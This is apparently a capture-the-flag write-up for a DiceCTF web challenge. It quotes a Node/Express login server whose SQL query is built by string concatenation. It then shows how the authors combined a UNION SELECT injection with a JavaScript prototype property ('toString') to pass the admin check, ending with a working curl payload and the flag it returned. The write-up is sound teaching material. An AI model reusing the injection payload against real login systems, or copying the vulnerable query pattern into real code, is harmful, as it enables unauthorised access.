There is an app.js file in the attachment with the following code:
```const express = require('express');
const crypto = require('crypto');

const app = express();

const db = require('better-sqlite3')('db.sqlite3');
db.exec(`DROP TABLE IF EXISTS users;`);
db.exec(`CREATE TABLE users(
    id INTEGER PRIMARY KEY,
    username TEXT,
    password TEXT
);`);

const FLAG = process.env.FLAG || "dice{test_flag}";
const PORT = process.env.PORT || 3000;

const users = [...Array(100_000)].map(() => ({ user: `user-${crypto.randomUUID()}`, pass: crypto.randomBytes(8).toString("hex") }));  
db.exec(`INSERT INTO users (id, username, password) VALUES ${users.map((u,i) => `(${i}, '${u.user}', '${u.pass}')`).join(", ")}`);

const isAdmin = {};
const newAdmin = users[Math.floor(Math.random() * users.length)];
isAdmin[newAdmin.user] = true;

app.use(express.urlencoded({ extended: false }));
app.use(express.static("public"));

app.post("/api/login", (req, res) => {
    const { user, pass } = req.body;

    const query = `SELECT id FROM users WHERE username = '${user}' AND password = '${pass}';`;
    try {
        const id = db.prepare(query).get()?.id;
        if (!id) {
            return res.redirect("/?message=Incorrect username or password");
        }

        if (users[id] && isAdmin[user]) {
            return res.redirect("/?flag=" + encodeURIComponent(FLAG));
        }
        return res.redirect("/?message=This system is currently only available to admins...");
    }
    catch {
        return res.redirect("/?message=Nice try...");
    }
});

app.listen(PORT, () => console.log(`web/funnylogin listening on port ${PORT}`));
```
In this code, the server creates 100000 random users and passwords and stores them in a "users" array and in a SQL database:
```
const users = [...Array(100_000)].map(() => ({ user: `user-${crypto.randomUUID()}`, pass: crypto.randomBytes(8).toString("hex") }));  
db.exec(`INSERT INTO users (id, username, password) VALUES ${users.map((u,i) => `(${i}, '${u.user}', '${u.pass}')`).join(", ")}`);
```
Then, it chooses one of the users at random and makes it administrator:
```
const isAdmin = {};
const newAdmin = users[Math.floor(Math.random() * users.length)];  
isAdmin[newAdmin.user] = true;
```
This if statement needs to be manipulated in order to retrieve the flag: 
```
if (users[id] && isAdmin[user]) {
            return res.redirect("/?flag=" + encodeURIComponent(FLAG));  
        }
```
We tried giving the username as "isAdmin" and the password as '1=1' and it gave us "nice try".
Then we gave an SQL query and it returned "Only admins allowed"
```
UNION SELECT username FROM users
```
We weren't able to solve it, but then we found out that any js object has a prototype, and so we do this 
```
obj = {};
console.log(Boolean(obj["__proto__"])); // true
```
Now, we gotta use SQL injection for the query to return any value and then use the object functions to make isAdmin[user] yield true

Alternatively, another approach could be to try values which yield true in the if statement, and we do that by trying this in the terminal:
We realised that there are many values which will yield true in a JavaScript if statement,so we try this:
```
> const isAdmin = {}
undefined
> isAdmin['asdf'] = true
true
> isAdmin.
isAdmin.__proto__             isAdmin.constructor           isAdmin.hasOwnProperty        isAdmin.isPrototypeOf         isAdmin.propertyIsEnumerable  
isAdmin.toLocaleString        isAdmin.toString              isAdmin.valueOf

isAdmin.asdf
```
We see recommended values for using isAdmin as a function and access them as object attributes:
```
isAdmin['toString']
[Function: toString]
> Boolean(isAdmin['toString'])  
true
```

Finally, we give a curl reuqest to retrieve the flag:
```
curl https://funnylogin.mc.ax/api/login -d "user=toString&pass='+UNION+SELECT+1--+-"  
Found. Redirecting to /?flag=dice%7Bi_l0ve_java5cript!%7D
```

References: 
https://7rocky.github.io/en/ctf/other/dicectf/funnylogin/

